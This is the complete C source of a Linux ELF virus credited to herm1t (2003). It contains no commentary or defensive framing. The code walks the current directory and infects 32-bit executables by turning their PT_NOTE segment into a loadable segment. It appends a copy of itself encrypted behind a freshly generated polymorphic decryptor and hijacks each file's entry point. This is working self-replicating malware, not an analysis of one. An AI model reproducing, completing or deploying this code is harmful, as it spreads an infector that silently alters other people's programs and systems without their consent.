/* Virus Linux.Adhoc by herm1t / Sep 2003 */
#include <elf.h>

#define NULL			((void*)0)
#define	PAGE_SIZE		0x1000
#define DIRENT_DNAME		10
#define DIRENT_SIZE		268
#define ASM_LABEL(L)		extern void L(void)
#define SECTION(S)		__attribute__((__section__(#S)))

#define syscall0(NR)		({ long r; asm volatile ("int $0x80":	\
"=a"(r):"0"(NR));r;})
#define syscall1(NR,a)		({ long r; asm volatile ("int $0x80": 	\
"=a"(r):"0"(NR),"b"((long)(a)));r;})
#define syscall2(NR,a,b)	({ long r; asm volatile ("int $0x80":	\
"=a"(r):"0"(NR),"b"((long)(a)),"c"((long)(b)));r;})
#define syscall3(NR,a,b,c)	({ long r; asm volatile("int $0x80":	\
"=a"(r):"0"(NR),"b"((long)(a)),"c"((long)(b)),"d"((long)(c)));r;})
#define syscall6(NR,a,b,c,d,e,f)({ long r;				\
asm volatile ("push %%ebp\nmovl %%eax,%%ebp\nmovl %1,%%eax\nint $0x80\npop %%ebp":	\
"=a"(r):"i"(NR),"b"((long)(a)),"c"((long)(b)),"d" ((long)(c)),		\
"S"((long)(d)),"D" ((long)(e)),"0"((long)(f))); r; })

#define exit(a)			syscall1(1,  a)
#define read(a,b,c)		syscall3(3,  a,b,c)
#define	write(a,b,c)		syscall3(4,  a,b,c)
#define open(a,b)		syscall2(5,  a,b)
#define	close(a)		syscall1(6,  a)
#define	creat(a,b)		syscall2(8,  a,b)
#define time(a)			syscall1(13, a)
#define lseek(a,b,c)		syscall3(19, a,b,c)
#define	rename(a,b)		syscall2(38, a,b)
#define readdir(a,b)		syscall2(89, a,b)
#define munmap(a,b)		syscall2(91, a,b)
#define	mprotect(a,b,c)		syscall3(125,a,b,c)
#define mmap(a,b,c,d,e,f)	syscall6(192,a,b,c,d,e,f)

unsigned int random(unsigned int *seed, unsigned int range)
{
	return (*seed = *seed * 214013 + 2531011) % range;
}

#define	D_SIZE	0x1e	/* size of decryptor	*/
#define H_SIZE	0x54	/* size of header	*/

int make_body(unsigned int old_entry, unsigned int new_entry,
	unsigned int vir_start, unsigned int vir_size, unsigned char *buf)
{
	int		i;
	unsigned int	seed;
	unsigned char	key, op, reg, *c;

	seed	= time(0);
	key	= random(&seed, 255);
	op	= random(&seed, 3);
	do reg	= random(&seed, 7); while (reg == 4 || reg == 5);
	c = buf;

	/* push old_entry 	*/
	*c++ = 0x68;
	*(unsigned int *)c = old_entry;
	c+=4;
	/* pusha */
	*c++ = 0x60;
	/* mov reg, start 	*/
	*c++ = 0xb8 | reg;
	*(unsigned int *)c = new_entry + D_SIZE;
	c+=4;
	/* .L1: 		*/
	*c++ = 0x80;
	switch(op) {
		case 0:	/* xor [reg], key	*/
			*c++ = 0x30 | reg;
			break;
		case 1:	/* sub [reg], key	*/
			*c++ = 0x28 | reg;
			break;
		case 2:	/* add [reg], key	*/
			*c++ = 0x00 | reg;
			break;
	}
	*c++ = key;
	/* inc reg */
	*c++ = 0x40 | reg;
	/* cmp reg, end 	*/
	*c++ = 0x81;
	*c++ = 0xf8 | reg;
	*(unsigned int *)c = new_entry + D_SIZE + vir_size;
	c+=4;
	/* jna .L1 		*/
	*c++ = 0x76;
	*c++ = 0xf4;
	/* call start()		*/
	*c++ = 0xe8;
	*(unsigned int *)c = 2;
	c+=4;
	/* popa			*/
	*c++ = 0x61;
	/* ret			*/
	*c++ = 0xc3;

	c = (unsigned char *)vir_start;
	for (i = 0; i < vir_size; i++, c++)
		switch (op) {
			case 0: buf[D_SIZE + i] = *c ^ key;
				break;
			case 1: buf[D_SIZE + i] = *c + key;
				break;
			case 2: buf[D_SIZE + i] = *c - key;
				break;
		}

	return vir_size + D_SIZE;
}

int infect(char *name, unsigned int vir_start, unsigned int vir_size)
{
	int		h, l, r = 0, i;
	unsigned int	va;
	unsigned char	*map;
	Elf32_Ehdr	*ehdr;
	Elf32_Phdr	*phdr, *note;
	unsigned char	buf[1024];

	if ((h = open(name, 2)) < 0)
		goto done;
	if ((l = lseek(h, 0, 2)) < PAGE_SIZE)
		goto close;
	if ((map = (unsigned char*)mmap(0, l, 3, 1, h, 0)) >
		(unsigned char*)0xfffff000)
		goto close;

	ehdr = (Elf32_Ehdr *)map;

	if (	ehdr->e_ident[0] != 0x7f || ehdr->e_ident[1] != 'E' ||
		ehdr->e_ident[2] != 'L'  || ehdr->e_ident[3] != 'F' ||
		ehdr->e_type != ET_EXEC || ehdr->e_machine != EM_386 ||
		(ehdr->e_ident[EI_OSABI] != 0 && ehdr->e_ident[EI_OSABI] != 3))
		goto unmap;

	phdr = (Elf32_Phdr *)(map + ehdr->e_phoff);
	va	= -1;
	note	= NULL;

	for (i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_NOTE)
			note = &phdr[i];
		if (phdr[i].p_vaddr < va)
			va = phdr[i].p_vaddr;
	}

	if (va == -1 || note == NULL)
		goto unmap;

	va = ((va - (2 * PAGE_SIZE)) + (l & (PAGE_SIZE - 1)));
	i = make_body(ehdr->e_entry, va, vir_start, vir_size, buf);

	note->p_vaddr	= va;
	note->p_paddr	= va;
	note->p_type	= PT_LOAD;
	note->p_flags	= 6;
	note->p_filesz	= i;
	note->p_memsz	= i;
	note->p_offset	= l;
	note->p_align	= 0;

	if (write(h, buf, i) != i)
		goto unmap;

	ehdr->e_entry = va;
	r = 1;

	unmap:	munmap(map, l);
	close:	close(h);
	done:	return r;
}

void SECTION(.text.end)		end(void){}

void SECTION(.text.start)	start(void)
{
	unsigned int	addr, size;
	unsigned short	dir = 0x2e;
	int		h;
	char		buf[DIRENT_SIZE];
	ASM_LABEL(off);

	asm volatile ("
		call	off
	off:	pop	%%eax":"=a"(addr));
	addr	= addr - ((unsigned int)off - (unsigned int)start);
	size	= (unsigned int)end - (unsigned int)start;
	if ((h = open((char *)&dir, 0)) < 0)
		return;
	while (readdir(h, buf) == 1)
		if (infect(buf + DIRENT_DNAME, addr, size) == 1)
			break;
	close(h);
}
